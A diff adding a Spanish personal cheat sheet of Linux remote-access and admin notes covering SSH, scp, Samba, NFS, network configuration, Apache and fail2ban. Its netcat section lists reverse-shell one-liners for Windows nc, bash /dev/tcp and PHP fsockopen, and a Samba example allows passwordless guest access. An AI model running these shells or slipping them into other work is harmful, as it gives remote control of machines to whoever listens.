@@ -1,0 +1,249 @@
+﻿                                                      CONEXIÓN REMOTA
+
+—---------------------------------------------SERVICIOS—-----------------------------------------------------
+
+
+
+—-------------------------------------------CONEXIÓN POR TELNET------------------------------------------
+
+telnet IP [port] # Para conectarse al servidor desde el PC cliente
+
+------------------------------------------CONEXIÓN POR SERVIDOR SSH—--------------------------------
+
+Fecha: 25/07/2023 Mod 02/09
+
+sudo apt install ssh # Para instalar el servidor  ssh
+
+sudo apt install openssh-server # Para instalar el servidor ssh (Opcion2)
+
+sudo nano /etc/ssh/sshd_config # Archivo de configuración, cambiar puerto.
+
+
+ssh -p[port] user@IP    # Para conectarme al servidor desde el PC cliente
+
+Descargar archivos por ssh # Todo se hace desde la terminal cliente
+
+scp -r -P [port] client.txt user@IP:/home/server  # Del host al servidor
+
+scp -r -P [port] user@IP:/home/server/client.txt  /home/client/  # Del servidor al host
+
+
+
+-------------------------------------------CONEXIÓN POR NETCAT-------------------------------------------
+
+sudo apt install rlwrap  # Instalar rlwrap
+sudo apt install netcat  # Instalar netcat
+nc -h # Verifico la versión.
+sudo rlwrap nc -lvnp [port]  # Me pongo por escucha por un puerto 
+
+nc.exe -e cmd.exe IP [port]    # Windows
+/bin/bash -i >& /dev/tcp/IP/[port] 0>&1 #Bash   Linux
+
+php -r '$sock=fsockopen("IP",[port]);exec("/bin/bash -i<&3 >&3 2>&3");' //PHP
+
+
+—-----------------------------------CONEXIÓN POR SERVIDOR EN PYTHON—------------------------
+
+sudo python3 -m http.server [port] # Pc servidor
+
+ [IP] # Poner la ip del servidor en el navegador.
+
+
+                                      CONEXIÓN TRANSFERENCIA DE ARCHIVOS
+
+27/08/2023 
+—-----------------------------------CONEXIÓN POR SERVIDOR SAMBA—------------------------
+
+sudo apt install samba # Instalación de Samba
+
+sudo nano /etc/samba/smb.conf # Archivo de configuracion
+
+[global]
+   workgroup = WORKGROUP
+   interfaces = 192.168.0.52/24 # opcional
+
+[LinuxShare]
+   comment = Mi Servidor Linux 
+   path = /ShareDisk
+   browseable = yes
+   read only = no
+   writeable = yes
+   guest ok = yes
+
+	
+ 
+#[share]
+#   comment = Mi Servidor 
+#   path =
+#   browseable = yes  para que mi red sea visible
+#   read only = no	Para que tengan permisos de lectura y escritura debe estar como "no"
+#   writeable = yes      Para que los usuarios tengan permiso de escritura
+#   write list =    	Para listar que usuarios tienen permisos de escritura
+#   guest ok = yes	Permite acceder a usuarios invitados y autenticados sin contraseña
+#   guest only = Yes     Permite acceder a usuarios invitados excluyendo a los autenticados.
+#   public = yes  	Permite acceder tanto a invitados como autenticados sin restricciones.
+#   valid users =          Aca hay que crear un usuario con password en smb o en la pc servidor y con ese se accede a la pc cliente
+
+sudo smbpasswd -a usuario # Poner el usuario y seguido la contraseña para samba
+
+smbd # servicio Samba
+nmbd # servicio NMB
+
+[IP] # Poner la ip del servidor en el explorador de archivos.
+
+—-------------------------------------------CONEXIÓN POR SFTP---------------------------------------------
+# Protocolo de transferencia de archivos seguro basado en SSH.
+
+sftp -P [port] user@IP  # Para conectarme al servidor desde el PC cliente Terminal Linux y Windows
+
+—-------------------------------------------CONEXIÓN POR FTP-----------------------------------------------
+
+   # Para conectarme al servidor desde el PC cliente Terminal Linux y Windows
+
+—-------------------------------------------CONEXIÓN POR FTPS----------------------------------------------
+# Protocolo de transferencia de archivos seguro de FTP.
+
+# Para conectarme al servidor desde el PC cliente Terminal Linux
+
+
+—--------------------------------------------CONEXIÓN POR NFS-----------------------------------------------
+
+sudo mount -t nfs -o port=4565 IP:/ruta/remota /ruta/local # Solo en linux
+—-------------------------------------------------------------------------------------------------------------------------
+
+nano /etc/network/interfaces
+
+# Configuración estática
+
+auto lo
+iface lo inet loopback
+
+auto [adaptador] 
+#allow-hotplug [adaptador]                            
+iface [adaptador]  inet static 
+	wpa-ssid RED
+	wpa-psk CLAVE
+        	address 192.168.0.x
+    	netmask 255.255.255.0
+    	gateway 192.168.0.1
+#   	dns-nameservers 	8.8.8.8  8.8.4.4
+
+# Configuración dinámica por dhcp
+
+auto lo
+iface lo inet loopback
+
+auto [adaptador]                            
+iface [adaptador]  inet dhcp
+wpa-ssid RED
+	wpa-psk CLAVE
+
+
+
+# Crea un archivo de configuración para wpa_supplicant 
+
+/etc/wpa_supplicant/wpa_supplicant.conf
+
+sudo wpa_passphrase RED CONTRASEÑA > wpa_supplicant.conf
+
+# Inicia wpa_supplicant con el archivo de configuración
+sudo wpa_supplicant -B -i [adaptador]  -c /etc/wpa_supplicant/wpa_supplicant.conf
+
+# Obtén una dirección IP usando dhclient
+sudo dhclient [adaptador] 
+
+# Servidor DNS
+
+nano /etc/resolv.conf
+ nameserver 8.8.8.8
+ nameserver 
+
+/etc/init.d/networking restart
+
+SERVIDOR
+
+# Configurar para poder acceder con la terminal kitty de forma remota
+export TERM="xterm"
+# Añadir al path  las siguientes rutas
+export PATH=$PATH:/bin:/usr/bin:/sbin:/usr/sbin
+# Comando para apagar la pantalla
+apt install vbetool
+alias on='sudo vbetool dpms on'
+alias off='sudo vbetool dpms off'
+# Apagar pantalla al cerrar la tapa
+
+nano /etc/systemd/logind.conf
+
+Descomentar 
+
+#HandleLidSwitch=suspend borrar suspend y poner ignore
+#HandleLidSwitchExternalPower=suspend
+
+Reiniciar el servicio
+
+systemctl restart systemd-logind
+
+#configurar un web apache
+
+cd /etc/apache2/sites-available
+
+cp 000-default.conf  web1.conf
+
+nano web1.conf
+
+ServerName tuxitotuxi.com
+    	ServerAdmin webmaster@localhost
+    	DocumentRoot /var/www/html/miweb
+
+cd /var/www/html/
+mkdir miweb
+index.html
+css.html
+script.js
+
+a2ensite web1.conf
+/usr/bin a2ensite web1.conf   ruta completa si no funciona
+reiniciar apache
+
+who numeros de terminales
+
+ssh
+
+cambiar puerto
+
+PermitEmptyPasswords no descomentar
+#PermitRootLogin prohibit-password
+#PermitRootLogin no
+
+
+apci controlar la bateria
+
+# banear conexiones a servicios
+etc/fail2ban/jail.local
+cp jail.conf jail.local
+nano jail.local
+
+ignoreip = 127.0.0.1/8 ::192.168.0.x descomentar y ponemos la ip que no baneara
+# "bantime" is the number of seconds that a host is banned.
+bantime  = 24h   baneado por 24horas
+
+# A host is banned if it has generated "maxretry" during the last "findtime"
+# seconds.
+findtime  = 1m en 1min erras
+
+# "maxretry" is the number of failures before a host get banned.
+maxretry = 3  3veces vas a ser vaneado por 24h
+
+no-ip 127.0.0.1 excluye a sea ip 
+
+tail -f /var/log/fail2ban.log para ver las ips baneadaas
+
+
+
+
+#tener cosola interactiva 
+chsh
+contraseña usuario
+escribir /bin/bash
+
+
